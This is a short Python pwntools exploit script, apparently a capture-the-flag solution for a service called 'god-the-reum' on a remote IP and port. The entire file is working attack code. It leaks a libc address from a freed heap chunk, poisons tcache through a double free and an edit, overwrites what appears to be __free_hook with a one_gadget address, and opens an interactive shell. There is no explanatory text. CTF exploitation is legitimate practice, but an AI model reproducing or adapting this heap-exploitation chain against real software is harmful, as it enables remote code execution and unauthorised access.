from pwn import *

#r = process(['god-the-reum'])
r = remote("110.10.147.103", 10001)
r.sendlineafter(":","1")
r.sendlineafter(":","1280")
r.sendlineafter(":","1")
r.sendlineafter(":","0")

r.sendlineafter(":","3")
r.sendlineafter(":","0")
r.sendlineafter(":","1280")

r.sendlineafter(":","4")
r.recvuntil("ballance ")
libc = int(r.recvline())-0x3ebca0
print hex(libc)

r.sendlineafter(":","3")
r.sendlineafter(":","1")
r.sendlineafter(":","0")
r.sendlineafter(":","3")
r.sendlineafter(":","1")
r.sendlineafter(":","0")

r.sendlineafter(":","6")
r.sendlineafter(":","1")
r.sendlineafter(":",p64(libc+0x3ed8e8))

r.sendlineafter(":","1")
r.sendlineafter(":","0")
r.sendlineafter(":","1")
r.sendlineafter(":","0")
r.sendlineafter(":","6")
r.sendlineafter(":","3")
r.sendlineafter(":",p64(libc+0x4f322))

r.sendlineafter(":","3")
r.sendlineafter(":","1")
r.sendlineafter(":","0")



r.interactive()
